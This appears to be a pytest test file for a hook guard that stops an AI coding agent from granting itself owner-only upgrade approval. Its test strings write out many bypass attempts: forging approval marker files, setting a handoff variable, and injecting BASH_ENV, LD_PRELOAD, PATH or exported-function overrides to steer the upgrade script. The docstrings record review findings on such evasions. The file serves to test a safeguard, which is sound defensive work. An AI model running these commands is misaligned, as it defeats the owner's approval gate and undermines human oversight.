"""Tests for UpgradeApprovalGuardHandler (Plan 00376, review finding MAJOR 4).

The pre-deploy upgrade gate lets the project OWNER approve a breaking upgrade
via a one-shot marker file written by ``hooks-daemon approve-upgrade <version>
--from <previous>`` (a command that requires a TTY and a typed confirmation
phrase). An AGENT must never be able to grant that approval itself, by any of
the routes the review found:

1. running the ``approve-upgrade`` CLI subcommand (or the standalone gate's
   ``approve`` subcommand) itself;
2. writing/touching the marker file under an ``upgrade-approvals/`` directory
   by any Bash route;
3. authoring the marker directly with Write/Edit/NotebookEdit;
4. exporting/assigning ``HOOKS_DAEMON_UPGRADE_HANDOFF``, the variable Layer 1
   names its one-shot handoff file in, which impersonates Layer 1;
5. forging a venv's ``.daemon-version`` stamp, by any of the routes in (2)
   or via Write/Edit.

Mentioning any of this inside a git commit message, non-executing echo/printf
prose, a grep search, or a quoted-delimiter heredoc body must NOT be denied —
those are the same inert-text exemptions the rest of this codebase's Bash
guards already grant.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest

from claude_code_hooks_daemon.constants.rule_ids import RuleID
from claude_code_hooks_daemon.core.data_layer import reset_data_layer
from claude_code_hooks_daemon.core.rule import Rule
from claude_code_hooks_daemon.handlers.pre_tool_use.upgrade_approval_guard import (
    ENV_VAR_UPGRADE_HANDOFF,
    UpgradeApprovalGuardHandler,
)

AGENT_RULE_ID = RuleID.UPGRADE_APPROVAL_AGENT_ACTION
ENV_RULE_ID = RuleID.UPGRADE_APPROVAL_ENV_BYPASS


@pytest.fixture(autouse=True)
def _reset_disclosure_tracker():
    """The DisclosureTracker is a process-wide singleton (Plan 00116, Decision G)."""
    reset_data_layer()
    yield
    reset_data_layer()


def _bash(command: str, cwd: str | None = None) -> dict[str, Any]:
    hook_input: dict[str, Any] = {"tool_name": "Bash", "tool_input": {"command": command}}
    if cwd is not None:
        hook_input["cwd"] = cwd
    return hook_input


def _write(file_path: str, content: str = "") -> dict[str, Any]:
    return {"tool_name": "Write", "tool_input": {"file_path": file_path, "content": content}}


def _edit(file_path: str, new_string: str = "x") -> dict[str, Any]:
    return {
        "tool_name": "Edit",
        "tool_input": {"file_path": file_path, "old_string": "", "new_string": new_string},
    }


def _notebook_edit(notebook_path: str) -> dict[str, Any]:
    return {
        "tool_name": "NotebookEdit",
        "tool_input": {"notebook_path": notebook_path, "new_source": "x"},
    }


@pytest.fixture
def handler() -> UpgradeApprovalGuardHandler:
    return UpgradeApprovalGuardHandler()


class TestInit:
    def test_priority_is_20(self, handler: UpgradeApprovalGuardHandler) -> None:
        assert handler.priority == 20

    def test_terminal(self, handler: UpgradeApprovalGuardHandler) -> None:
        assert handler.terminal is True


class TestApproveUpgradeCommand:
    """Item 1: running `approve-upgrade` (or the standalone `approve`) itself."""

    @pytest.mark.parametrize(
        "command",
        [
            ".claude/hooks-daemon/bin/hooks-daemon approve-upgrade 4.0.0 --from 3.66.0",
            "bin/hooks-daemon approve-upgrade 4.0.0 --from 3.66.0",
            "hooks-daemon approve-upgrade 4.0.0 --from 3.66.0",
            "python -m claude_code_hooks_daemon.daemon.cli approve-upgrade 4.0.0 --from 3.66.0",
            "python3 -m claude_code_hooks_daemon.daemon.cli approve-upgrade 4.0.0 --from 3.66.0",
            "python3 /workspace/src/claude_code_hooks_daemon/install/"
            "upgrade_gate_standalone.py approve --to 4.0.0 --from 3.66.0",
        ],
    )
    def test_denies_running_the_approval_command(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        hook_input = _bash(command)
        assert handler.matches(hook_input) is True
        result = handler.handle(hook_input)
        assert result.decision == "deny"
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{AGENT_RULE_ID}]")

    def test_denies_when_chained_after_another_command(
        self, handler: UpgradeApprovalGuardHandler
    ) -> None:
        hook_input = _bash("echo hi && bin/hooks-daemon approve-upgrade 4.0.0 --from 3.66.0")
        assert handler.matches(hook_input) is True

    def test_allows_ordinary_hooks_daemon_commands(
        self, handler: UpgradeApprovalGuardHandler
    ) -> None:
        assert handler.matches(_bash("bin/hooks-daemon status")) is False
        assert handler.matches(_bash("bin/hooks-daemon restart")) is False

    def test_allows_git_commit_message_mentioning_it(
        self, handler: UpgradeApprovalGuardHandler
    ) -> None:
        command = (
            "git commit -m 'document the bin/hooks-daemon approve-upgrade 4.0.0 "
            "--from 3.66.0 flow'"
        )
        assert handler.matches(_bash(command)) is False

    def test_allows_echo_mentioning_it(self, handler: UpgradeApprovalGuardHandler) -> None:
        command = "echo 'run: bin/hooks-daemon approve-upgrade 4.0.0 --from 3.66.0'"
        assert handler.matches(_bash(command)) is False

    def test_allows_printf_mentioning_it(self, handler: UpgradeApprovalGuardHandler) -> None:
        command = "printf 'run: bin/hooks-daemon approve-upgrade 4.0.0 --from 3.66.0\\n'"
        assert handler.matches(_bash(command)) is False

    def test_allows_grep_for_it(self, handler: UpgradeApprovalGuardHandler) -> None:
        assert handler.matches(_bash("grep approve-upgrade docs/UPGRADING.md")) is False

    def test_allows_quoted_heredoc_body_written_to_file(
        self, handler: UpgradeApprovalGuardHandler
    ) -> None:
        command = (
            "cat > untracked/scratch/notes.md <<'EOF'\n"
            "run: bin/hooks-daemon approve-upgrade 4.0.0 --from 3.66.0\n"
            "EOF\n"
        )
        assert handler.matches(_bash(command)) is False

    def test_echo_with_live_substitution_is_still_denied(
        self, handler: UpgradeApprovalGuardHandler
    ) -> None:
        """An echo whose argument really EXECUTES something is not exempt."""
        command = 'echo "$(bin/hooks-daemon approve-upgrade 4.0.0 --from 3.66.0)"'
        assert handler.matches(_bash(command)) is True


class TestApprovalMarkerWrites:
    """Item 2: writing/touching the marker under upgrade-approvals/ via Bash."""

    @pytest.mark.parametrize(
        "command",
        [
            "echo approved > untracked/upgrade-approvals/4.0.0.approved",
            "echo approved >> untracked/upgrade-approvals/4.0.0.approved",
            "printf approved | tee untracked/upgrade-approvals/4.0.0.approved",
            "touch untracked/upgrade-approvals/4.0.0.approved",
            "cp /tmp/marker untracked/upgrade-approvals/4.0.0.approved",
            "mv /tmp/marker untracked/upgrade-approvals/4.0.0.approved",
            "mkdir -p untracked/upgrade-approvals",
        ],
    )
    def test_denies_writing_under_the_approvals_directory(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        hook_input = _bash(command)
        assert handler.matches(hook_input) is True
        result = handler.handle(hook_input)
        assert result.decision == "deny"
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{AGENT_RULE_ID}]")

    @pytest.mark.parametrize(
        "command",
        [
            "ls untracked/upgrade-approvals",
            "cat untracked/upgrade-approvals/4.0.0.approved",
            "stat untracked/upgrade-approvals/4.0.0.approved",
            "grep 4.0.0 untracked/upgrade-approvals/4.0.0.approved",
            "find untracked/upgrade-approvals -print",
            "test -f untracked/upgrade-approvals/4.0.0.approved",
        ],
    )
    def test_allows_read_only_access(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        assert handler.matches(_bash(command)) is False

    def test_allows_unrelated_mkdir(self, handler: UpgradeApprovalGuardHandler) -> None:
        assert handler.matches(_bash("mkdir -p untracked/scratch")) is False


class TestApprovalMarkerFileTool:
    """Item 3: Write/Edit/NotebookEdit authoring the marker directly."""

    def test_denies_write(self, handler: UpgradeApprovalGuardHandler) -> None:
        hook_input = _write("untracked/upgrade-approvals/4.0.0.approved", "forged\n")
        assert handler.matches(hook_input) is True
        result = handler.handle(hook_input)
        assert result.decision == "deny"
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{AGENT_RULE_ID}]")

    def test_denies_edit(self, handler: UpgradeApprovalGuardHandler) -> None:
        hook_input = _edit("untracked/upgrade-approvals/4.0.0.approved")
        assert handler.matches(hook_input) is True

    def test_denies_notebook_edit(self, handler: UpgradeApprovalGuardHandler) -> None:
        hook_input = _notebook_edit("untracked/upgrade-approvals/notes.ipynb")
        assert handler.matches(hook_input) is True

    def test_allows_write_elsewhere(self, handler: UpgradeApprovalGuardHandler) -> None:
        hook_input = _write("untracked/scratch/notes.md", "hello\n")
        assert handler.matches(hook_input) is False


class TestEnvVarBypass:
    """Item 4: HOOKS_DAEMON_UPGRADE_HANDOFF."""

    @pytest.mark.parametrize(
        "command",
        [
            "HOOKS_DAEMON_UPGRADE_HANDOFF=/tmp/x bash scripts/upgrade_version.sh --project-root /workspace",
            "export HOOKS_DAEMON_UPGRADE_HANDOFF=/tmp/x",
            "env HOOKS_DAEMON_UPGRADE_HANDOFF=/tmp/x bash scripts/upgrade_version.sh",
            "declare -x HOOKS_DAEMON_UPGRADE_HANDOFF=/tmp/x",
        ],
    )
    def test_denies_setting_the_bypass_vars(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        hook_input = _bash(command)
        assert handler.matches(hook_input) is True
        result = handler.handle(hook_input)
        assert result.decision == "deny"
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{ENV_RULE_ID}]")

    @pytest.mark.parametrize(
        "command",
        [
            'echo "$HOOKS_DAEMON_UPGRADE_HANDOFF"',
            "grep HOOKS_DAEMON_UPGRADE_HANDOFF scripts/upgrade_version.sh",
            'printf "%s\\n" "${HOOKS_DAEMON_UPGRADE_HANDOFF}"',
        ],
    )
    def test_allows_merely_reading_the_vars(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        assert handler.matches(_bash(command)) is False


class TestUpgradeSteeringVariables:
    """An upgrade run with a variable that picks its interpreter, venv or code.

    Review of e27bd73f: `HOOKS_DAEMON_PYTHON` pointed the gate at a crafted
    interpreter that printed `gate-verdict=proceed`. Layer 2 no longer takes
    the gate's interpreter or the installed version from these, and the guard
    denies an agent setting them on an upgrade invocation.
    """

    @pytest.mark.parametrize(
        "command",
        [
            "HOOKS_DAEMON_PYTHON=/tmp/fake bash scripts/upgrade.sh --project-root .",
            "HOOKS_DAEMON_VENV_PATH=/tmp/forged bash .claude/hooks-daemon/scripts/upgrade.sh"
            " --project-root .",
            "PATH=/tmp/fake:$PATH bash .claude/skills/hooks-daemon/scripts/upgrade.sh v4.0.0",
            "HOSTNAME=other bash scripts/upgrade_version.sh /p /p/.claude/hooks-daemon v4.0.0",
            "env HOOKS_DAEMON_CLONE_URL=/tmp/evil bash /tmp/upgrade.sh --project-root .",
            "HOOKS_DAEMON_UPGRADE_BASE_URL=file:///tmp/evil bash .claude/skills/hooks-daemon/"
            "scripts/upgrade.sh",
            "export HOOKS_DAEMON_PYTHON=/tmp/fake && bash scripts/upgrade.sh --project-root .",
            "UPGRADE_FLAGS=--skip-reading-confirmation=abc bash scripts/upgrade_version.sh a b c",
            "HOOKS_DAEMON_PYTHON=/tmp/fake python3 src/claude_code_hooks_daemon/install/"
            "upgrade_gate_standalone.py --to 4.0.0",
            "HOOKS_DAEMON_UPGRADE_SECOND_PASS=1 bash scripts/upgrade_version.sh a b c",
            "HOOKS_DAEMON_UPGRADE_PREVIOUS_VERSION=v4.0.0 bash scripts/upgrade_version.sh a b c",
            "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.excludesFile bash scripts/upgrade.sh",
            "GIT_DIR=/tmp/other bash scripts/upgrade.sh --project-root .",
        ],
    )
    def test_denies_steering_an_upgrade(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        hook_input = _bash(command)
        assert handler.matches(hook_input) is True, command
        result = handler.handle(hook_input)
        assert result.decision == "deny"
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{ENV_RULE_ID}]")

    @pytest.mark.parametrize(
        "command",
        [
            "bash scripts/upgrade.sh --project-root . v4.0.0",
            "PATH=/opt/bin:$PATH make test",
            "grep HOOKS_DAEMON_PYTHON scripts/upgrade.sh",
            "echo 'HOOKS_DAEMON_PYTHON=/x bash scripts/upgrade.sh'",
            'bash "$tmp" --project-root "$PWD" "$TARGET"',
        ],
    )
    def test_allows_other_uses(self, handler: UpgradeApprovalGuardHandler, command: str) -> None:
        assert handler.matches(_bash(command)) is False, command

    def test_allows_an_override_on_a_script_it_can_read(
        self, handler: UpgradeApprovalGuardHandler, tmp_path: Path
    ) -> None:
        """A relative script is read against the hook's `cwd` (every real hook
        input carries one); it is not the upgrade, so the override is fine."""
        (tmp_path / "bin").mkdir()
        (tmp_path / "bin" / "hooks-daemon").write_text('#!/bin/bash\nexec python -m cli "$@"\n')
        command = "PATH=/opt/bin:$PATH bin/hooks-daemon status"
        assert handler.matches(_bash(command, cwd=str(tmp_path))) is False

    def test_allows_an_override_on_a_script_that_is_not_the_upgrade(
        self, handler: UpgradeApprovalGuardHandler, tmp_path: Any
    ) -> None:
        (tmp_path / "install.sh").write_text("#!/bin/bash\necho installing\n")
        command = "HOOKS_DAEMON_PYTHON=/usr/bin/python3.12 bash install.sh --project-root ."
        assert handler.matches(_bash(command, cwd=str(tmp_path))) is False


class TestUpgradeRecognisedByWhatItIs:
    """Fresh review BLOCKER 1: the documented route runs Layer 1 from a temp file.

    `bash "$tmp" --project-root ...` names no guarded script, so the guard
    must recognise an upgrade by its arguments or its content, not its name.
    """

    @pytest.mark.parametrize(
        "command",
        [
            'PATH=/x/bin:$PATH bash "$tmp" --project-root "$PWD" v4.0.0',
            'HOOKS_DAEMON_PYTHON=/x bash "$tmp" --project-root P v4.0.0',
            'export PATH=/x/bin:$PATH && bash "$tmp" --project-root "$PWD" "$TARGET"',
            'PATH=/x "$tmp" --skip-reading-confirmation=abc123 v4.0.0',
            'PATH=/x bash /tmp/l2.sh "$PWD" "$PWD/.claude/hooks-daemon" v4.0.0',
            'env PATH=/x timeout 900 bash "$tmp" --project-root .',
            "bash -c 'PATH=/x bash \"$tmp\" --project-root .'",
            'BASH_ENV=/tmp/evil.sh bash "$tmp" --project-root .',
            'ENV=/tmp/evil.sh sh "$tmp" --project-root .',
            'LD_PRELOAD=/tmp/evil.so bash "$tmp" --project-root .',
            "PYTHONPATH=/tmp/evil bash scripts/upgrade.sh --project-root .",
            'HOME=/tmp/fakehome bash "$tmp" --project-root .',
            'TMPDIR=/tmp/mine bash "$tmp" --project-root .',
            "env 'BASH_FUNC_timeout%%=() { echo x; }' bash \"$tmp\" --project-root .",
            'timeout() { echo x; }; export -f timeout; bash "$tmp" --project-root .',
            'cat "$tmp" | PATH=/x bash -s -- --project-root .',
            "PATH=/x bash -ec 'bash \"$tmp\" --project-root .'",
        ],
    )
    def test_denies_steering_an_upgrade_run_from_any_file(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        hook_input = _bash(command)
        assert handler.matches(hook_input) is True, command
        result = handler.handle(hook_input)
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{ENV_RULE_ID}]")

    def test_denies_steering_a_renamed_copy_of_layer1(
        self, handler: UpgradeApprovalGuardHandler, tmp_path: Any
    ) -> None:
        (tmp_path / "install.sh").write_text(
            '#!/bin/bash\nexport HOOKS_DAEMON_UPGRADE_HANDOFF="$handoff"\n'
        )
        command = "PATH=/x/bin:$PATH bash install.sh v4.0.0"
        assert handler.matches(_bash(command, cwd=str(tmp_path))) is True

    def test_an_unstattable_script_path_does_not_crash_the_guard(
        self, handler: UpgradeApprovalGuardHandler, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """`check_eacces_safe_predicates`: a raw `.is_file()` on a caller-named
        absolute path raises `PermissionError` when an ancestor directory is
        not traversable, which must not propagate out of `matches()`. The
        command's own argument SHAPE (`--project-root`) still recognises it.
        """

        def _denied(self: Path) -> bool:
            raise PermissionError(13, "Permission denied", str(self))

        monkeypatch.setattr(Path, "is_file", _denied)
        command = 'PATH=/x bash /tmp/unreadable-ancestor/script.sh --project-root "$PWD" v4.0.0'
        assert handler.matches(_bash(command)) is True


class TestSteeredRunOnAnUnresolvableScriptFailsClosed:
    """Plan 00376 review3 MAJOR 1 — the N29 evasion shape.

    A shell run on a script this handler cannot READ (unreadable) or cannot
    RESOLVE STATICALLY (a `$`-path, `/dev/stdin`, `/dev/fd/*`, a process
    substitution, or `-s`/no-operand stdin) used to fall through to the
    argument-shape heuristic, which sees nothing when the arguments are also
    variables -- Layer 2's own positional call shape
    (`bash "$s" "$p" "$d" "$v"`, no `--project-root` flag, no literal
    `.claude/hooks-daemon` text) gives it nothing to match. `BASH_ENV` runs
    inside Layer 2 before `_sanitise_layer2_env` ever gets a say, so this
    combination -- steering assignment present, script unresolvable -- must
    itself count as running the upgrade. The argument heuristic stays the
    only signal for the UNSTEERED case (no regression: see
    `test_allows_other_uses` and `test_allows_an_override_on_a_script_that_is_not_the_upgrade`).
    """

    @pytest.mark.parametrize(
        "command",
        [
            # A read failure on an existing-but-unreadable script.
            'BASH_ENV=/tmp/evil.sh bash /tmp/unreadable-steered.sh "$p" "$d" "$v"',
            # A `$`-path: never resolved statically at all.
            's=/tmp/copy.sh; BASH_ENV=/tmp/evil.sh bash "$s" "$p" "$d" "$v"',
            # `/dev/stdin`: whatever this process's own stdin holds is not
            # what the real subprocess would read from its OWN redirect.
            'BASH_ENV=/tmp/evil.sh bash /dev/stdin "$p" "$d" "$v" < /tmp/copy.sh',
            # `/dev/fd/N`: same class as `/dev/stdin`.
            'BASH_ENV=/tmp/evil.sh bash /dev/fd/63 "$p" "$d" "$v"',
            # Process substitution: not a real path the shell parser exposes.
            'BASH_ENV=/tmp/evil.sh bash <(cat /tmp/copy.sh) "$p" "$d" "$v"',
            # `-s`: the script comes from stdin, so there is no path at all.
            'cat /tmp/copy.sh | BASH_ENV=/tmp/evil.sh bash -s -- "$p" "$d" "$v"',
            # An exported function steering variable, same unresolvable script.
            's=/tmp/copy.sh; env \'BASH_FUNC_unset%%=() { :; }\' bash "$s" "$p" "$d" "$v"',
        ],
    )
    def test_a_steering_assignment_on_an_unresolvable_script_is_denied(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        hook_input = _bash(command)
        assert handler.matches(hook_input) is True, command
        result = handler.handle(hook_input)
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{ENV_RULE_ID}]")

    def test_a_steered_relative_script_with_no_cwd_is_denied(
        self, handler: UpgradeApprovalGuardHandler
    ) -> None:
        """With no `cwd` in the hook input a relative path cannot be resolved,
        which is the same "cannot tell" as an unreadable script."""
        command = 'BASH_ENV=/tmp/evil.sh bash copy.sh "$p" "$d" "$v"'
        assert handler.matches(_bash(command)) is True

    def test_an_unsteered_relative_script_with_no_cwd_is_allowed(
        self, handler: UpgradeApprovalGuardHandler
    ) -> None:
        assert handler.matches(_bash('bash copy.sh "$p" "$d" "$v"')) is False

    def test_a_script_that_fails_to_open_is_reported_and_still_denied(
        self,
        handler: UpgradeApprovalGuardHandler,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        caplog: pytest.LogCaptureFixture,
    ) -> None:
        """An OSError while reading the script is surfaced at WARNING, not
        swallowed at debug, and a steered run of it still fails closed."""
        script = tmp_path / "copy.sh"
        script.write_text("#!/bin/bash\n")
        real_open = Path.open

        def _failing_open(self: Path, *args: Any, **kwargs: Any) -> Any:
            if self == script:
                raise OSError(5, "Input/output error", str(self))
            return real_open(self, *args, **kwargs)

        monkeypatch.setattr(Path, "open", _failing_open)
        command = f'BASH_ENV=/tmp/evil.sh bash {script} "$p" "$d" "$v"'

        with caplog.at_level("WARNING"):
            assert handler.matches(_bash(command)) is True

        assert any(
            record.levelname == "WARNING" and str(script) in record.getMessage()
            for record in caplog.records
        )

    def test_an_unresolvable_script_with_no_steering_is_still_allowed(
        self, handler: UpgradeApprovalGuardHandler
    ) -> None:
        """No regression: the unsteered case still needs argument shape."""
        command = 's=/tmp/copy.sh; bash "$s" "$p" "$d" "$v"'
        assert handler.matches(_bash(command)) is False


_LAYER2_RUN = (
    "bash /c/.claude/hooks-daemon/scripts/upgrade_version.sh /p /c/.claude/hooks-daemon v4.0.0"
)
_LAYER1_RUN = "bash scripts/upgrade.sh --project-root ."


class TestVariableInterpreterRunningAKnownProgram:
    """Ledger 00474 N285: an interpreter held in a variable is not itself an
    upgrade. `PYTHONPATH=$PWD/src $PY/python -m pytest ...` ran a literal
    module and was denied only because the HEAD word started with `$`. What it
    runs is judged; only a program that stays unresolved keeps the deny."""

    @pytest.fixture
    def qa_script(self, tmp_path: Path) -> Path:
        script = tmp_path / "scripts" / "qa" / "audit_error_hiding.py"
        script.parent.mkdir(parents=True)
        script.write_text("print('audit')\n")
        return script

    @pytest.mark.parametrize(
        "command",
        [
            "PY=/x/venv/bin; PYTHONPATH=$PWD/src $PY/python -m pytest -q tests/unit/foo.py",
            "PYTHONPATH=$PWD/src $PY/python -m pytest -q tests/unit/foo.py",
            "P=/x/venv/bin/python; PYTHONPATH=$PWD/src $P -m pytest -q tests/unit/foo.py",
            'P=/x/python; PYTHONPATH="$PWD/src" "$P" -u -m pytest tests/unit/foo.py',
        ],
    )
    def test_a_literal_module_is_allowed(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        assert handler.matches(_bash(command)) is False, command

    def test_a_literal_script_that_is_not_the_upgrade_is_allowed(
        self, handler: UpgradeApprovalGuardHandler, qa_script: Path, tmp_path: Path
    ) -> None:
        command = (
            "P=/x/venv/bin/python; cd /y; "
            "PYTHONPATH=$PWD/src $P scripts/qa/audit_error_hiding.py --all"
        )
        assert handler.matches(_bash(command, cwd=str(tmp_path))) is False

    def test_a_literal_script_that_carries_the_upgrade_is_denied(
        self, handler: UpgradeApprovalGuardHandler, tmp_path: Path
    ) -> None:
        script = tmp_path / "copy.py"
        script.write_text(f"# {ENV_VAR_UPGRADE_HANDOFF}\n")
        command = f"PYTHONPATH=x $PY {script}"
        assert handler.matches(_bash(command)) is True

    @pytest.mark.parametrize(
        "command",
        [
            # The program itself is unresolved.
            'PYTHONPATH=x $P "$SCRIPT"',
            "PYTHONPATH=x $P $SCRIPT",
            'PYTHONPATH=x $PY -c "$CODE"',
            "PYTHONPATH=x $PY -c 'import os'",
            'PYTHONPATH=x $PY -m "$MOD"',
            "PYTHONPATH=x $PY -m $MOD",
            "PYTHONPATH=x $PY",
            "PYTHONPATH=x $PY -",
            'PYTHONPATH=x bash -c "$X"',
            # A script that cannot be found cannot be judged.
            "PYTHONPATH=x $PY scripts/qa/missing.py",
            # The daemon's own CLI may carry the upgrade subcommand.
            "PYTHONPATH=x $PY -m claude_code_hooks_daemon.daemon.cli upgrade",
            "PYTHONPATH=x $PY/python -m claude_code_hooks_daemon.daemon.cli upgrade",
            # The upgrade by name, whatever runs it.
            "PYTHONPATH=x bash .claude/hooks-daemon/scripts/upgrade.sh --project-root .",
            "PYTHONPATH=x $PY scripts/upgrade.sh --project-root .",
            "PYTHONPATH=x $PY -m pytest scripts/upgrade_version.sh",
            "PYTHONPATH=x $PY --uv /tmp/uv scripts/upgrade.sh",
            f"{ENV_VAR_UPGRADE_HANDOFF}=/tmp/h $PY -m pytest tests/unit/foo.py",
        ],
    )
    def test_an_unresolved_program_or_an_upgrade_stays_denied(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        hook_input = _bash(command)
        assert handler.matches(hook_input) is True, command
        result = handler.handle(hook_input)
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{ENV_RULE_ID}]")


class TestSteeredLiteralInterpreterInAGroupOrAfterAnExport:
    """Ledger 00474 N311: `(PYTHONPATH=/x/src /v/bin/python -m pytest t.py)` and
    `export PYTHONPATH=/x/src && .venv/bin/python -m pytest t.py` run no
    upgrade. A grouping `(` made the head word unreadable, and a relative or
    missing interpreter path was judged as a SCRIPT that could not be found,
    which counts as the upgrade once something steers. An interpreter is judged
    by what its arguments run, as `$PY` is (N285)."""

    @pytest.mark.parametrize(
        "command",
        [
            "(PYTHONPATH=/x/src /v/bin/python -m pytest tests/x.py -q)",
            "( PYTHONPATH=/x/src /v/bin/python -m pytest tests/x.py -q )",
            "((PYTHONPATH=/x/src /v/bin/python3.11 -m pytest tests/x.py))",
            "export PYTHONPATH=/x/src && /v/bin/python -m pytest tests/x.py",
            "export PYTHONPATH=/x/src; .venv/bin/python -m pytest tests/x.py -q",
            "export PYTHONPATH=/x/src && (cd /tmp && /v/bin/python -m pytest t.py)",
            "PYTHONPATH=/x/src /v/bin/python -m pytest tests/x.py",
            "(PYTHONPATH=/x/src /v/bin/python -m pytest t.py) 2>&1",
        ],
    )
    def test_a_steered_literal_module_run_is_allowed(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        assert handler.matches(_bash(command, cwd="/nonexistent")) is False, command

    @pytest.mark.parametrize(
        "command",
        [
            "(PYTHONPATH=x /v/bin/python -c 'import os')",
            "(PYTHONPATH=x /v/bin/python -m claude_code_hooks_daemon.daemon.cli upgrade)",
            "(PYTHONPATH=x /v/bin/python scripts/qa/missing.py)",
            "(PYTHONPATH=x /v/bin/python -m pytest scripts/upgrade_version.sh)",
            "(PYTHONPATH=x bash scripts/upgrade.sh --project-root .)",
            "(PYTHONPATH=x bash .claude/hooks-daemon/scripts/upgrade.sh)",
            "(PYTHONPATH=x bash -c 'bash scripts/upgrade.sh --project-root .')",
            '(PYTHONPATH=x bash "$S")',
            "(PYTHONPATH=x ./run.sh)",
            '(PYTHONPATH=x /v/bin/python "$S")',
            '(PYTHONPATH=x /v/bin/python -m "$M")',
            "export PYTHONPATH=x && /v/bin/python -c 'import os'",
            "export PYTHONPATH=x && /v/bin/python scripts/qa/missing.py",
            "export PYTHONPATH=x && bash scripts/upgrade.sh --project-root .",
            "export PYTHONPATH=x && ./run.sh",
            "export PYTHONPATH=x && (bash scripts/upgrade.sh --project-root .)",
            "(export PYTHONPATH=x; bash scripts/upgrade.sh --project-root .)",
            f"({ENV_VAR_UPGRADE_HANDOFF}=/tmp/h /v/bin/python -m pytest tests/x.py)",
            f"(export {ENV_VAR_UPGRADE_HANDOFF}=/tmp/h; python -m pytest tests/x.py)",
        ],
    )
    def test_a_group_or_export_around_an_upgrade_or_unknown_program_stays_denied(
        self, handler: UpgradeApprovalGuardHandler, command: str
    ) -> None:
        hook_input = _bash(command, cwd="/nonexistent")
        assert handler.matches(hook_input) is True, command
        result = handler.handle(hook_input)
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{ENV_RULE_ID}]")


class TestSteeredInterpreterRunAfterALeadingCd:
    """Ledger 00474 N292: `cd /proj && V=...; PYTHONPATH=/proj/src $V/python
    rel/probe.py` ran a readable script that is not the upgrade, and was denied
    because the script's relative path was resolved against the HOOK's cwd, not
    the directory the command's own leading `cd` moved to -- so it looked
    missing, and a missing script is "cannot tell", which counts as the upgrade
    once something steers. Only a leading `cd <literal existing dir>` chain is
    followed; anything less certain keeps the hook's cwd and the deny."""

    @pytest.fixture
    def project(self, tmp_path: Path) -> Path:
        project = tmp_path / "proj"
        (project / "scratch").mkdir(parents=True)
        (project / "scratch" / "probe.py").write_text("print('probe')\n")
        return project

    @pytest.fixture
    def elsewhere(self, tmp_path: Path) -> Path:
        other = tmp_path / "elsewhere"
        other.mkdir()
        return other

    def test_the_n292_command_is_allowed(
        self, handler: UpgradeApprovalGuardHandler, project: Path, elsewhere: Path
    ) -> None:
        command = (
            f'cd {project} && V=/v/bin; echo "== main"; '
            f"PYTHONPATH={project}/src $V/python scratch/probe.py 2>&1 "
            '| grep -v "^\\s*$"; echo "== branch"; '
            f"PYTHONPATH={project}/other/src $V/python scratch/probe.py 2>&1 "
            '| grep -v "^\\s*$"'
        )
        assert handler.matches(_bash(command, cwd=str(elsewhere))) is False

    def test_the_minimal_shape_with_the_script_under_the_hook_cwd_is_allowed(
        self, handler: UpgradeApprovalGuardHandler, project: Path
    ) -> None:
        command = "PYTHONPATH=/p/src $V/python scratch/probe.py"
        assert handler.matches(_bash(command, cwd=str(project))) is False

    def test_a_relative_cd_is_followed_from_the_hook_cwd(
        self, handler: UpgradeApprovalGuardHandler, project: Path, tmp_path: Path
    ) -> None:
        command = "cd proj; PYTHONPATH=/p/src $V/python scratch/probe.py"
        assert handler.matches(_bash(command, cwd=str(tmp_path))) is False

    def test_a_chain_of_leading_cds_is_followed(
        self, handler: UpgradeApprovalGuardHandler, project: Path, tmp_path: Path
    ) -> None:
        command = f"cd {tmp_path} && cd proj && PYTHONPATH=/p/src $V/python scratch/probe.py"
        assert handler.matches(_bash(command, cwd="/")) is False

    def test_a_leading_cd_into_a_dir_whose_script_carries_the_upgrade_is_denied(
        self, handler: UpgradeApprovalGuardHandler, project: Path, elsewhere: Path
    ) -> None:
        (project / "scratch" / "copy.py").write_text(f"# {ENV_VAR_UPGRADE_HANDOFF}\n")
        command = f"cd {project} && PYTHONPATH=/p/src $V/python scratch/copy.py"
        hook_input = _bash(command, cwd=str(elsewhere))
        assert handler.matches(hook_input) is True
        result = handler.handle(hook_input)
        assert result.reason is not None
        assert result.reason.startswith(f"BLOCKED [{ENV_RULE_ID}]")

    @pytest.mark.parametrize(
        "command_template",
        [
            # A cd that does not exist leaves the shell where it was under `;`.
            "cd {missing}; PYTHONPATH=/p/src $V/python scratch/probe.py",
            "cd {missing} && PYTHONPATH=/p/src $V/python scratch/probe.py",
            # A computed, home-relative or previous-dir target is never followed.
            'cd "$D" && PYTHONPATH=/p/src $V/python scratch/probe.py',
            "cd ~/x && PYTHONPATH=/p/src $V/python scratch/probe.py",
            "cd - && PYTHONPATH=/p/src $V/python scratch/probe.py",
            # A cd that may run in a subshell, in a pipe or be skipped.
            "(cd {project}) ; PYTHONPATH=/p/src $V/python scratch/probe.py",
            "cd {project} || true; PYTHONPATH=/p/src $V/python scratch/probe.py",
            "cd {project} | cat; PYTHONPATH=/p/src $V/python scratch/probe.py",
            # Any later cd/pushd/popd makes the directory unknowable.
            "cd {project} && cd .. && PYTHONPATH=/p/src $V/python scratch/probe.py",
